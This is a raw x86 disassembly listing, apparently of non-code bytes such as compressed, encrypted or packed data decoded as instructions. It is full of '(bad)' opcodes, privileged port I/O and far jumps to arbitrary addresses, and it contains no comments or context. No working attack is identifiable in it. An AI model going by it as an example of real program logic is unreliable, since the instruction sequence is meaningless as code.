  412f46:	and    edx,DWORD PTR [ebp+0x129b4cda]
  412f4c:	stos   DWORD PTR es:[edi],eax
  412f4d:	sbb    al,0x6
  412f4f:	push   esp
  412f50:	cmp    eax,0x8c0a71d3
  412f55:	xor    ah,bl
  412f57:	jns    0x412f4a
  412f59:	in     al,dx
  412f5a:	retf   
  412f5b:	ja     0x412f75
  412f5d:	push   0xd22cd53e
  412f62:	sub    eax,0x103ae42f
  412f67:	sbb    dh,dl
  412f69:	xor    BYTE PTR [eax],cl
  412f6b:	shr    edx,0x30
  412f6e:	clc    
  412f6f:	aaa    
  412f70:	popa   
  412f71:	in     al,dx
  412f72:	aad    0xcd
  412f74:	int3   
  412f75:	fcmovnu st,st(3)
  412f77:	xor    ch,bh
  412f79:	mov    ds:0x925c8979,al
  412f7e:	or     ebp,DWORD PTR [ebp+eax*4+0x4d37e785]
  412f85:	pop    ebp
  412f86:	xchg   edi,eax
  412f87:	inc    edx
  412f88:	push   ebx
  412f89:	inc    edi
  412f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f8b:	xor    dl,BYTE PTR [esi]
  412f8d:	pop    ecx
  412f8e:	push   0xffffffd9
  412f90:	stc    
  412f91:	mov    cl,0xe4
  412f93:	jne    0x412f92
  412f95:	mov    al,ds:0x8233b015
  412f9a:	or     eax,0xbfdc72ab
  412f9f:	or     DWORD PTR [ebp+0x6d5df874],ebx
  412fa5:	push   ebx
  412fa6:	and    BYTE PTR [eax+ebp*2+0xa],dl
  412faa:	mov    ah,BYTE PTR [esp+ebx*8-0x2b6a7953]
  412fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fb2:	cmp    eax,0xc37fc181
  412fb7:	arpl   WORD PTR [ecx],cx
  412fb9:	mov    ah,0x7a
  412fbb:	add    al,0xa8
  412fbd:	bnd jb 0x412fa6
  412fc0:	jmp    0xbe75:0x3ae4ca13
  412fc7:	(bad)  
  412fc9:	jge    0x412ff9
  412fcb:	jmp    0xcde869f1
  412fd0:	int3   
  412fd1:	pop    edi
  412fd2:	dec    ebx
  412fd3:	retf   0x7cba
  412fd6:	ror    edi,1
  412fd8:	dec    ebx
  412fd9:	adc    eax,DWORD PTR cs:[ecx]
  412fdc:	xchg   ecx,eax
  412fdd:	ss or  eax,0x7ba65c06
  412fe3:	shl    BYTE PTR [eax-0x7a],cl
  412fe6:	jge    0x412fc9
  412fe8:	xor    al,0x5e
  412fea:	jecxz  0x412f7f
  412fec:	jecxz  0x412fe9
  412fee:	cmc    
  412fef:	xchg   ebp,eax
  412ff0:	adc    DWORD PTR [edi-0x28],ebp
  412ff3:	or     edi,DWORD PTR [ebx]
  412ff5:	sub    BYTE PTR [ebp+0x1],al
  412ff8:	call   0xe7b3:0x5346a96
  412fff:	cli    
  413000:	mov    ch,0xae
  413002:	daa    
  413003:	lods   eax,DWORD PTR ds:[esi]
  413004:	mov    dh,BYTE PTR [ebp-0x6ed78ce3]
  41300a:	xchg   esi,eax
  41300b:	jns    0x412fee
  41300d:	mov    esi,0x40e2cd2d
  413012:	cld    
  413013:	add    eax,0xd181d8d0
  413018:	dec    esp
  413019:	cs xor DWORD PTR ss:[edx],ebx
  41301d:	lods   al,BYTE PTR ds:[esi]
  41301e:	mov    edx,0xe6f42682
  413023:	dec    ebp
  413024:	adc    eax,0x68abd8de
  413029:	mov    ds:0xb6f123e9,al
  41302e:	jl     0x413045
  413030:	xchg   esp,eax
  413031:	dec    esp
  413032:	lods   eax,DWORD PTR ds:[esi]
  413033:	nop
  413034:	fs sub eax,0x2f4bbf45
  41303a:	lahf   
  41303b:	ret    0x4b02
  41303e:	stc    
  41303f:	adc    ah,BYTE PTR [edi+eax*1-0x12]
  413043:	test   BYTE PTR [esi+0x1158440e],bl
  413049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41304a:	test   al,0x19
  41304c:	jae    0x412fdf
  41304e:	aam    0x29
  413050:	pop    edi
  413051:	push   ecx
  413052:	inc    ecx
  413053:	pop    ss
  413054:	mov    bh,dl
  413056:	or     BYTE PTR [edx],bl
  413058:	pop    ebx
  413059:	mov    DWORD PTR [edi+eax*8],esi
  41305c:	ret    
  41305d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41305e:	call   0x1a4b241e
  413063:	xchg   esi,eax
  413064:	nop
  413065:	(bad)  
  413066:	xchg   esp,eax
  413067:	add    DWORD PTR cs:[edx+0x6],eax
  41306b:	dec    ebx
  41306c:	dec    esp
  41306d:	xor    BYTE PTR [ebp+0x4a079303],dh
  413073:	push   0xdaab7d17
  413078:	cmp    ah,BYTE PTR [ebx-0x7b77936d]
  41307e:	clc    
  41307f:	or     al,BYTE PTR [eax-0x48e2e35e]
  413085:	(bad)  
  413086:	xor    edx,edi
  413088:	mov    eax,ds:0xa0bf5533
  41308d:	aas    
  41308e:	test   DWORD PTR [esi-0x54],edi
  413091:	cmp    al,0xcb
  413093:	mov    al,0xa
  413095:	in     eax,dx
  413096:	push   ecx
  413097:	add    dh,BYTE PTR [esi+0x7a]
  41309a:	lds    edi,FWORD PTR [ecx]
  41309c:	jle    0x41304d
  41309e:	pusha  
  41309f:	icebp  
  4130a0:	inc    edi
  4130a1:	pop    esi
  4130a2:	mov    eax,0xeef192b7
  4130a7:	mov    esi,0xd505c3f1
  4130ac:	ret    0x74c0
  4130af:	repnz pop ds
  4130b1:	test   al,0x49
  4130b3:	xchg   ecx,eax
  4130b4:	mov    eax,ds:0x640a152
  4130b9:	sbb    al,0x9b
  4130bb:	xor    al,0x8f
  4130bd:	dec    ebp
  4130be:	mov    bl,0xd6
  4130c0:	test   DWORD PTR [ecx+0x5e3fff34],0x3cc53af7
  4130ca:	jno    0x4130d2
  4130cc:	ror    esi,0x3
  4130cf:	test   BYTE PTR [edx+0x37],0x4a
  4130d3:	les    edi,FWORD PTR [ebp+0x57afb89d]
  4130d9:	pop    esi
  4130da:	scas   eax,DWORD PTR es:[edi]
  4130db:	loop   0x413063
  4130dd:	das    
  4130de:	xchg   esi,eax
  4130df:	rcl    DWORD PTR [esi-0x19],cl
  4130e2:	add    eax,DWORD PTR [edi+0x2f]
  4130e5:	pop    eax
  4130e6:	ss inc ecx
  4130e8:	and    DWORD PTR [ebp+eiz*1-0x20],0xfffffff2
  4130ed:	and    al,0xa3
  4130ef:	lods   eax,DWORD PTR ds:[esi]
  4130f0:	xchg   ecx,eax
  4130f1:	mov    edx,0xd43f5a45
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	hlt    
  4130f8:	in     al,dx
  4130f9:	inc    eax
  4130fa:	lock mov edx,0x7c79266d
  413100:	pop    esp
  413101:	sub    BYTE PTR [esp+edx*4+0x5d],al
  413105:	sbb    edx,esp
  413107:	cs pop ds
  413109:	mov    eax,ds:0xfbdfa39e
  41310e:	loopne 0x41309a
  413110:	push   0xe818e319
  413115:	xor    ebp,DWORD PTR [edx]
  413117:	adc    esp,edi
  413119:	out    dx,al
  41311a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41311b:	pushf  
  41311c:	je     0x413167
  41311e:	xor    al,0x3f
  413120:	imul   edi,DWORD PTR [edi-0x9],0x65c0d21d
  413127:	out    dx,eax
  413128:	adc    al,0x98
  41312a:	xchg   esp,eax
  41312b:	ret    0xff18
  41312e:	arpl   WORD PTR [edi],bx
  413130:	hlt    
  413131:	inc    ebx
  413132:	(bad)  
  413133:	push   eax
  413134:	shl    esi,1
  413136:	idiv   dl
  413138:	jns    0x413112
  41313a:	mul    DWORD PTR [edx+0x53]
  41313d:	mov    eax,ds:0x926902aa
  413142:	pcmpgtb mm3,QWORD PTR [ebx-0x5b22e3a4]
  413149:	xor    eax,0x11c888fd
  41314e:	jp     0x413111
  413150:	icebp  
  413151:	out    0xbd,eax
  413153:	jb     0x413124
  413155:	xor    al,0x58
  413157:	mov    esi,0x92b397e2
  41315c:	pop    eax
  41315d:	shl    BYTE PTR [edx+0x1f95c8e9],cl
  413163:	in     eax,0x30
  413165:	adc    al,0x66
  413167:	add    BYTE PTR [edx+0x6f2e995e],dl
  41316d:	fdiv   QWORD PTR [edx+0x35]
  413170:	aam    0x5c
  413172:	sbb    eax,0x4e97943f
  413177:	mov    DWORD PTR [ebp+0x4107c718],esp
  41317d:	fistp  WORD PTR [ebx]
  41317f:	ss dec edx
  413181:	frstor [eax]
  413183:	pop    edi
  413184:	jl     0x4131a6
  413186:	arpl   WORD PTR [edx-0x3a29df8c],di
  41318c:	inc    ecx
  41318d:	add    dl,BYTE PTR [ebp-0x33e0bbc4]
  413193:	ds jecxz 0x4131e6
  413196:	popf   
  413197:	in     eax,dx
  413198:	ds hlt 
  41319a:	jb     0x413186
  41319c:	pushf  
  41319d:	cmp    BYTE PTR [ecx-0x685773fc],bl
  4131a3:	repnz (bad) 
  4131a6:	mov    ah,0x57
  4131a8:	loop   0x4131e3
  4131aa:	add    DWORD PTR [edi-0x50],edi
  4131ad:	and    DWORD PTR [ecx+0x1549613a],ecx
  4131b3:	xor    esp,edi
  4131b5:	sbb    eax,0x1ac6a924
  4131ba:	jae    0x413183
  4131bc:	fwait
  4131bd:	cwde   
  4131be:	repz es cmp eax,0x1ee1400c
  4131c5:	inc    BYTE PTR [esi+0x6e]
  4131c8:	pusha  
  4131c9:	cdq    
  4131ca:	and    DWORD PTR [edi-0x1dbfb448],ebx
  4131d0:	jbe    0x413207
  4131d2:	jp     0x413155
  4131d4:	mov    ecx,0x78bbeafa
  4131d9:	add    DWORD PTR [eax],ecx
  4131db:	xlat   BYTE PTR ds:[ebx]
  4131dc:	scas   eax,DWORD PTR es:[edi]
  4131dd:	ror    BYTE PTR [ecx],cl
  4131df:	sbb    al,0x30
  4131e1:	ret    
  4131e2:	push   ebp
  4131e3:	retf   
  4131e4:	fisub  WORD PTR [edi-0x80]
  4131e7:	pop    ecx
  4131e8:	(bad)  
  4131e9:	sub    eax,0x6c2fa1c6
  4131ee:	(bad)  
  4131ef:	mov    ds:0x97844bab,al
  4131f4:	add    eax,eax
  4131f6:	sbb    eax,0x8ef493ad
  4131fb:	in     al,dx
  4131fc:	int3   
  4131fd:	cmp    eax,0xe81fc00a
  413202:	push   ss
  413203:	pop    ss
  413204:	add    dl,bl
  413206:	int3   
  413207:	ins    BYTE PTR es:[edi],dx
  413208:	jnp    0x413257
  41320a:	pop    es
  41320b:	into   
  41320c:	pop    ds
  41320d:	add    al,bh
  41320f:	out    dx,eax
  413210:	pop    edi
  413211:	sbb    DWORD PTR ds:[edx+0x35],esi
  413215:	add    bh,BYTE PTR [eax+0x4f400ead]
  41321b:	xchg   ebx,eax
  41321c:	mov    bl,0x45
  41321e:	sbb    bh,ah
  413220:	stc    
  413221:	pop    ss
  413222:	out    dx,al
  413223:	enter  0xb19,0xbe
  413227:	dec    esp
  413228:	pop    ss
  413229:	retf   
  41322a:	cmc    
  41322b:	pop    ecx
  41322c:	pop    ebp
  41322d:	lock inc edx
  41322f:	sbb    al,0xd
  413231:	or     BYTE PTR [edx-0x3d],ah
  413234:	mov    WORD PTR [esi+0x17],ds
  413237:	cli    
  413238:	cld    
  413239:	or     eax,0xabef189e
  41323e:	sub    al,0x1e
  413240:	xor    edi,DWORD PTR ds:0x997209c0
  413246:	loopne 0x41327c
  413248:	call   edi
  41324a:	data16 aaa 
  41324c:	inc    BYTE PTR [edi+0x5c]
  41324f:	or     BYTE PTR ds:0xa8704d79,bh
  413255:	dec    edx
  413256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413257:	jge    0x4131e9
  413259:	test   BYTE PTR [ebp-0x26c8cd55],ch
  41325f:	pop    esp
  413260:	mov    ecx,esi
  413262:	inc    eax
  413263:	pop    ebp
  413264:	dec    edi
  413265:	jno    0x41327d
  413267:	push   esi
  413268:	xchg   ebx,eax
  413269:	stos   BYTE PTR es:[edi],al
  41326a:	push   eax
  41326b:	loope  0x41325e
  41326d:	cs inc esi
  41326f:	jnp    0x413238
  413271:	mov    al,ds:0x11a6f1ce
  413276:	xchg   esi,eax
  413277:	scas   eax,DWORD PTR es:[edi]
  413278:	mov    eax,0xff5aa72a
  41327d:	adc    al,ch
  41327f:	les    ebp,FWORD PTR [edi+eax*4]
  413282:	fdiv   QWORD PTR [ebp+ecx*2-0x1d]
  413286:	jbe    0x4132fe
  413288:	push   esp
  413289:	add    eax,0xbe89fa56
  41328e:	cdq    
  41328f:	cmp    eax,0xf896cd56
  413294:	sbb    eax,0x6a0f250b
  413299:	ret    
  41329a:	xchg   BYTE PTR ds:0xf9374aa1,cl
  4132a0:	outs   dx,BYTE PTR ds:[esi]
  4132a1:	lods   eax,DWORD PTR ds:[esi]
  4132a2:	(bad)  
  4132a3:	fsub   QWORD PTR [ebx]
  4132a5:	adc    cl,BYTE PTR fs:[ecx+0xc]
  4132a9:	cmp    BYTE PTR [ebx],al
  4132ab:	mov    WORD PTR [ecx+ebp*2+0x31],fs
  4132af:	fidiv  WORD PTR ds:0x4c97dfa1
  4132b5:	or     ah,BYTE PTR [ecx-0x37]
  4132b8:	mov    ah,0xd
  4132ba:	xchg   ebx,eax
  4132bb:	rcl    esp,0x88
  4132be:	mov    edi,0xf7f36e2a
  4132c3:	push   ebp
  4132c4:	shr    BYTE PTR [ebp+0x75],0xc
  4132c8:	arpl   WORD PTR [edx+esi*8+0x6d],ax
  4132cc:	pop    ebx
  4132cd:	lahf   
  4132ce:	pop    ebx
  4132cf:	and    al,0x1e
  4132d1:	mov    ds:0xc55a0c70,eax
  4132d6:	dec    esp
  4132d7:	leave  
  4132d8:	pop    edx
  4132d9:	dec    eax
  4132da:	add    eax,0x663049e5
  4132df:	mov    ebx,0x93ca6e8f
  4132e4:	ds dec ecx
  4132e6:	(bad)  
  4132e7:	movups XMMWORD PTR [ecx+0x317f47ee],xmm0
  4132ee:	jbe    0x4132eb
  4132f0:	(bad)  
  4132f1:	(bad)  
  4132f2:	jno    0x41335d
  4132f4:	fst    QWORD PTR [esi]
  4132f6:	pop    eax
  4132f7:	(bad)  
  4132f8:	out    0x23,al
  4132fa:	out    dx,eax
  4132fb:	lock pop ebx
  4132fd:	cmp    ch,BYTE PTR [edx-0x39b907dc]
  413303:	ss lock mov ebx,0x69b457c5
  41330a:	or     eax,0x541ead61
  41330f:	and    al,0x7b
  413311:	adc    al,0xf8
  413313:	je     0x4132ce
  413315:	inc    edi
  413316:	outs   dx,DWORD PTR ds:[esi]
  413317:	add    cl,BYTE PTR [edx+0x4f]
  41331a:	jnp    0x4132e0
  41331c:	mov    ds:0x640f9e65,al
  413321:	nop
  413322:	stos   BYTE PTR es:[edi],al
  413323:	es dec ebx
  413325:	fdiv   DWORD PTR [ebx-0x33]
  413328:	xchg   bl,cl
  41332a:	jl     0x413300
  41332c:	mov    bl,0xd9
  41332e:	dec    ecx
  41332f:	imul   ebp,DWORD PTR [ebp-0xf],0x8c27661f
  413336:	mov    bh,dh
  413338:	cwde   
  413339:	(bad)  
  41333a:	(bad)  
  41333b:	rcl    BYTE PTR [esi*8+0x79ce42c4],cl
  413342:	mul    BYTE PTR [edi*1-0x5d4989a4]
  413349:	and    ebx,0x55
  41334c:	jbe    0x4132d6
  41334e:	data16 jns 0x41332d
  413351:	inc    eax
  413352:	dec    esp
  413353:	pop    eax
  413354:	(bad)  
  413355:	daa    
  413356:	arpl   WORD PTR [eax+0x6e],di
  413359:	xchg   esp,eax
  41335a:	mov    ah,BYTE PTR [bx+si]
  41335d:	mov    edx,0x9b383ea2
  413362:	mov    DWORD PTR [ebx],0xc5169a89
  413368:	cmp    cl,0x54
  41336b:	enter  0x9b12,0xd5
  41336f:	pop    edi
  413370:	fnstcw WORD PTR [ebp-0x5dd324f8]
  413376:	jmp    0x41335c
  413378:	cmc    
  413379:	sbb    ch,BYTE PTR [edi-0x11]
  41337c:	mov    eax,ds:0x5938f04f
  413381:	jbe    0x41334f
  413383:	pop    es
  413384:	(bad)  
  413385:	leave  
  413386:	push   edx
  413387:	mov    edx,0xa9003f3f
  41338c:	mov    eax,0x2edfeabb
  413391:	add    al,cl
  413393:	inc    ecx
  413394:	xor    eax,0xc6fc28eb
  413399:	jle    0x4133e9
  41339b:	mov    ds:0x5638b14f,al
  4133a0:	ds cmp esi,esi
  4133a3:	jmp    0x6541:0xf7699bb4
  4133aa:	pop    es
  4133ab:	and    bl,BYTE PTR [edx-0x17d903be]
  4133b1:	fs ds out dx,eax
  4133b4:	xchg   ecx,eax
  4133b5:	mov    esi,0x54eb0e69
  4133ba:	into   
  4133bb:	jo     0x41342c
  4133bd:	pushf  
  4133be:	in     al,dx
  4133bf:	ins    BYTE PTR es:[edi],dx
  4133c0:	xchg   ebx,eax
  4133c1:	std    
  4133c2:	leave  
  4133c3:	and    edi,edi
  4133c5:	cmp    dl,al
  4133c7:	jne    0x413425
  4133c9:	icebp  
  4133ca:	data16 (bad) 
  4133cc:	jmp    0xb0e:0x6578dca7
  4133d3:	lea    esi,[ebx+0x34]
  4133d6:	adc    al,BYTE PTR [edi]
  4133d8:	mov    ecx,0xabd5bcf
  4133dd:	mov    WORD PTR [ecx],ss
  4133df:	push   eax
  4133e0:	leave  
  4133e1:	test   eax,0xb4ff2866
  4133e6:	sub    DWORD PTR [ecx+0x33e7f1a],edi
  4133ec:	sbb    eax,0x4e9ae813
  4133f1:	mov    bh,0x8a
  4133f3:	ror    BYTE PTR [eax+edx*8-0x2cfa597d],cl
  4133fa:	push   eax
  4133fb:	inc    esp
  4133fc:	sbb    dh,BYTE PTR [ecx+0x58b0d376]
  413402:	loopne 0x4133f5
  413404:	push   ebx
  413405:	cmp    cl,bh
  413407:	xchg   esi,eax
  413408:	mov    ebx,0xb9d4cd9e
  41340d:	dec    ecx
  41340e:	sbb    eax,ebx
  413410:	gs mov esi,0xaa67cf98
  413416:	pop    edx
  413417:	lock inc ecx
  413419:	aad    0x66
  41341b:	fisub  WORD PTR [edx-0xfae2400]
  413421:	cmp    al,al
  413423:	test   al,0x22
  413425:	test   BYTE PTR [ebx+0x22],ch
  413428:	sti    
  413429:	or     DWORD PTR [ecx+0x5e],esp
  41342c:	imul   edx,DWORD PTR [edi+0x58],0xcd83161a
  413433:	sub    eax,DWORD PTR [esi+eax*8]
  413436:	mov    edx,0x78527d19
  41343b:	or     al,0x1f
  41343d:	pop    eax
  41343e:	mov    esi,0x434a7f12
  413443:	mov    dh,0xaf
  413445:	sbb    DWORD PTR [esi+0x14],esp
  413448:	pop    DWORD PTR [ebx+eax*2+0x4a]
  41344c:	pushf  
  41344d:	loopne 0x4133e4
  41344f:	loop   0x413415
  413451:	jb     0xf0d2095d
  413457:	jmp    0x386d:0x908a11fa
  41345e:	aaa    
  41345f:	inc    BYTE PTR [edx+0x13d41d8]
  413465:	sbb    bl,BYTE PTR [ecx+0x1d1bab25]
  41346b:	mov    eax,0xd9e591c7
  413470:	mov    DWORD PTR [esi+0x2196c498],edi
  413476:	aad    0xd7
  413478:	fs nop
  41347a:	jp     0x413439
  41347c:	fwait
  41347d:	inc    ebx
  41347e:	cmp    BYTE PTR [edi-0x906e69],al
  413484:	push   ds
  413485:	lea    ebp,[esi-0x4f]
  413488:	sub    cl,0x4a
  41348b:	sub    eax,0x1efe67d5
  413490:	loop   0x413440
  413492:	pop    eax
  413493:	mov    BYTE PTR [edi-0x396db396],dl
  413499:	add    al,0x26
  41349b:	out    0xc1,eax
  41349d:	pop    ebp
  41349e:	xor    eax,0xaf0052ba
  4134a3:	jle    0x41343c
  4134a5:	jns    0x413477
  4134a7:	in     eax,0x3
  4134a9:	add    al,0xe2
  4134ab:	pop    ebx
  4134ac:	cli    
  4134ad:	mov    esp,0x2a2d3516
  4134b2:	(bad)  
  4134b3:	fwait
  4134b4:	scas   eax,DWORD PTR es:[edi]
  4134b5:	mov    bl,0xe9
  4134b7:	cmp    BYTE PTR [esi],dh
  4134b9:	mov    ebx,0x577cb93d
  4134be:	in     eax,dx
  4134bf:	call   0x942e:0xe140f19a
  4134c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134c7:	imul   ebx,DWORD PTR [esi-0x624b1186],0x41f04a8
  4134d1:	adc    al,0x35
  4134d3:	mov    cl,0x36
  4134d5:	sbb    eax,0x88d646a4
  4134da:	in     eax,dx
  4134db:	jmp    0xc65e8dd8
  4134e0:	sub    eax,0x85e2415a
  4134e5:	sub    cl,dl
  4134e7:	xchg   ebp,eax
  4134e8:	ss xchg ax,ax
  4134eb:	mov    cs,WORD PTR [edi+eiz*2-0xef3b010]
  4134f2:	in     al,dx
  4134f3:	and    DWORD PTR [edi],0x605bc781
  4134f9:	inc    esp
  4134fa:	mov    ch,BYTE PTR [edi-0x2792eaea]
  413500:	push   0xffffffb0
  413502:	add    BYTE PTR [ecx+0x7f],bh
  413505:	sbb    eax,0x246dcdd2
  41350a:	push   ebx
  41350b:	sar    esp,1
  41350d:	pusha  
  41350e:	xchg   edi,eax
  41350f:	mov    bh,0xb4
  413511:	push   esi
  413512:	aad    0xed
  413514:	jb     0x413556
  413516:	test   eax,0xb5a0efd0
  41351b:	mov    ds:0x24734026,eax
  413520:	sub    al,0x96
  413522:	popa   
  413523:	aaa    
  413524:	scas   al,BYTE PTR es:[edi]
  413525:	or     BYTE PTR [esi+edi*2-0x2b],bl
  413529:	sahf   
  41352a:	pusha  
  41352b:	or     BYTE PTR ds:0x8c70da52,0xd6
  413532:	push   0x3bb2c0bd
  413537:	fwait
  413538:	stos   DWORD PTR es:[edi],eax
  413539:	std    
  41353a:	int    0x4f
  41353c:	xor    cl,BYTE PTR [ecx+0x6f]
  41353f:	xor    eax,0x49dac3f6
  413544:	mov    edi,0xbf9bd8f1
  413549:	lods   eax,DWORD PTR ds:[esi]
  41354a:	jmp    0x4135ab
  41354c:	ror    BYTE PTR [edi+ecx*8-0x7b8c3655],cl
  413553:	pusha  
  413554:	retf   0x476d
  413557:	jo     0x413553
  413559:	sbb    DWORD PTR [edi+0x1b6c5145],edi
  41355f:	adc    eax,0x5483a19f
  413564:	dec    ebp
  413566:	jmp    0x413567
  413568:	jecxz  0x413563
  41356a:	push   edx
  41356b:	data16 aaa 
  41356d:	xchg   ebp,eax
  41356e:	out    0x60,eax
  413570:	scas   al,BYTE PTR es:[edi]
  413571:	add    eax,ebp
  413573:	pop    ebx
  413574:	sbb    esi,DWORD PTR [ebp+0x2ddac90b]
  41357a:	push   ss
  41357b:	outs   dx,BYTE PTR ds:[esi]
  41357c:	mov    esp,0xb355d4f6
  413581:	ror    al,cl
  413583:	xlat   BYTE PTR ds:[ebx]
  413584:	sbb    BYTE PTR [ebp-0xb],0xf
  413588:	iret   
  413589:	mov    ebp,0x2f97d84
  41358e:	test   DWORD PTR [eax+0x3c],edx
  413591:	mov    bl,0x16
  413593:	call   FWORD PTR [ebx+edi*1-0x49]
  413597:	leave  
  413598:	aam    0xef
  41359a:	or     ebx,DWORD PTR [esi]
  41359c:	inc    esp
  41359d:	(bad)  
  41359e:	cmp    DWORD PTR [ebx+0x41d6fab8],edi
  4135a4:	ins    DWORD PTR es:[edi],dx
  4135a5:	fwait
  4135a6:	shl    DWORD PTR [esi],cl
  4135a8:	lods   eax,DWORD PTR ds:[esi]
  4135a9:	adc    al,0x49
  4135ab:	add    edi,DWORD PTR [esi]
  4135ad:	sbb    eax,eax
  4135af:	bound  ecx,QWORD PTR [edx-0x9]
  4135b2:	bound  esp,QWORD PTR [ecx+0x27]
  4135b5:	push   ecx
  4135b6:	(bad)  
  4135b7:	leave  
  4135b8:	ret    0xa5ae
  4135bb:	into   
  4135bc:	mov    esi,0xdd53db11
  4135c1:	sbb    al,bl
  4135c3:	mov    eax,ds:0xad96fca9
  4135c8:	xchg   esp,eax
  4135c9:	pop    edx
  4135ca:	call   0x268110da
  4135cf:	mov    dh,ch
  4135d1:	sbb    BYTE PTR [ecx+eax*8],cl
  4135d4:	mov    cl,0xb7
  4135d6:	jecxz  0x4135c3
  4135d8:	jmp    0x4135c9
  4135da:	sti    
  4135db:	enter  0xdd38,0x73
  4135df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135e0:	(bad)  
  4135e2:	lahf   
  4135e3:	mov    ah,0x9a
  4135e5:	out    dx,eax
  4135e6:	sbb    ebx,DWORD PTR [esi+0x2d62dd5c]
  4135ec:	add    BYTE PTR [esi+0x48],0x43
  4135f0:	cwde   
  4135f1:	lock inc ebx
  4135f3:	cmp    edx,ecx
  4135f5:	mov    bh,BYTE PTR [ebp+0x31]
  4135f8:	xor    BYTE PTR [ebx],cl
  4135fa:	dec    ebx
  4135fb:	fld    DWORD PTR [ecx-0xd]
  4135fe:	jo     0x4135b8
  413600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413601:	dec    ecx
  413602:	nop
  413603:	packsswb mm2,QWORD PTR [esi-0x54da6efd]
  41360a:	sbb    ebx,DWORD PTR [edi-0x2f]
  41360d:	retf   
  41360e:	pop    ss
  41360f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413610:	dec    edx
  413611:	sahf   
  413612:	(bad)  
  413613:	jmp    0xd00e:0x9331ae88
  41361a:	add    dh,BYTE PTR ds:0x4db31578
  413620:	test   esp,esp
  413622:	push   edi
  413623:	push   0x3e
  413625:	pop    ebx
  413626:	(bad)  
  413627:	cmp    eax,0x30e54d9e
  41362c:	add    DWORD PTR [edx],edi
  41362e:	pop    edi
  41362f:	rcr    ebx,1
  413631:	test   al,0xed
  413633:	mov    al,ds:0xace34fea
  413638:	lds    ebp,FWORD PTR [ebp-0x7bd36fd]
  41363e:	inc    edx
  41363f:	retf   0xcb77
  413642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413643:	(bad)  [ebp+0x5ed61adb]
  413649:	jl     0x41369a
  41364b:	xchg   edx,eax
  41364c:	fbld   TBYTE PTR [eax+0x5d6b23f9]
  413652:	jle    0x4135f0
  413654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413655:	dec    edi
  413656:	fwait
  413657:	push   0x6b
  413659:	fs push ebp
  41365b:	mov    esp,0xbd788ec
  413660:	and    DWORD PTR [edi+edi*2],ecx
  413663:	in     al,dx
  413664:	mov    dl,0x83
  413666:	out    0x7c,eax
  413668:	sahf   
  413669:	or     al,0xe3
  41366b:	add    BYTE PTR [edx-0x1b],bh
  41366e:	fld    st(3)
  413670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413671:	add    eax,0x9c616865
  413676:	clc    
  413677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413678:	mov    eax,0x2adaf46a
  41367d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41367e:	aas    
  41367f:	jns    0x4136d4
  413681:	test   BYTE PTR [eax+eiz*2+0x22],0x77
  413686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413687:	push   ecx
  413688:	and    bh,bl
  41368a:	and    BYTE PTR [eax],dl
  41368c:	jne    0x4136f6
  41368e:	and    al,0xdc
  413690:	add    eax,0x14d70e90
  413695:	and    ebx,edi
  413697:	out    dx,eax
  413698:	loopne 0x4136e6
  41369a:	xor    DWORD PTR [ebp+0x1915af1d],ebp
  4136a0:	aaa    
  4136a1:	(bad)  
  4136a2:	and    al,0xc0
  4136a4:	and    DWORD PTR [esi],ebx
  4136a6:	fwait
  4136a7:	scas   al,BYTE PTR es:[edi]
  4136a8:	ja     0x413715
  4136aa:	fistp  QWORD PTR [ebx-0x50]
  4136ad:	cmp    eax,0x229a684a
  4136b2:	out    dx,al
  4136b3:	sub    DWORD PTR [ecx],ebx
  4136b5:	aam    0x46
  4136b7:	and    DWORD PTR [eax],edx
  4136b9:	out    dx,eax
  4136ba:	iret   
  4136bb:	mov    edx,0x1037c847
  4136c0:	xchg   BYTE PTR [eax+0x618318f5],ch
  4136c6:	push   ebp
  4136c7:	jo     0x41371c
  4136c9:	dec    eax
  4136ca:	xor    eax,0xbfc9c872
  4136cf:	retf   
  4136d0:	int    0xee
  4136d2:	dec    esi
  4136d3:	and    al,0xac
  4136d5:	cmp    ax,WORD PTR [edx]
  4136d8:	xchg   ebp,eax
  4136d9:	inc    ebp
  4136da:	cli    
  4136db:	or     dl,bl
  4136dd:	jns    0x4136f1
  4136df:	mov    al,ah
  4136e1:	lods   al,BYTE PTR ds:[esi]
  4136e2:	(bad)  
  4136e3:	jle    0x413670
  4136e5:	push   edi
  4136e6:	lds    edx,FWORD PTR [ecx-0x7613f3b3]
  4136ec:	scas   eax,DWORD PTR es:[edi]
  4136ed:	mov    ecx,0x42dc1118
  4136f2:	pop    edx
  4136f3:	mov    DWORD PTR ds:0x2f2daee3,eax
  4136f9:	imul   ebx,DWORD PTR [edx+0x56],0xffffffc7
  4136fd:	push   ebp
  4136fe:	mov    DWORD PTR [ebx+0x2c],edx
  413701:	mov    ds:0xfad95ec6,eax
  413706:	mov    bl,0x94
  413708:	shr    dl,1
  41370a:	dec    ebp
  41370b:	jecxz  0x413725
  41370d:	test   DWORD PTR [edx+0x23],ecx
  413710:	mov    al,ds:0x5d8f3ce5
  413715:	xchg   ebp,eax
  413716:	test   eax,0x765ca852
  41371b:	jmp    0x4136ef
  41371d:	push   ebp
  41371e:	aaa    
  41371f:	mov    ecx,0x6cf0f392
  413724:	rol    DWORD PTR [ecx],cl
  413726:	mov    ebp,0xb72a235f
  41372b:	jmp    0x46c47987
  413730:	or     DWORD PTR [esi-0x61],esp
  413733:	les    ebp,FWORD PTR [ebp-0x69]
  413736:	cld    
  413737:	xor    esi,DWORD PTR [edx+0x60]
  41373a:	xor    esp,ebp
  41373c:	daa    
  41373d:	pop    eax
  41373e:	sub    eax,0x86821c15
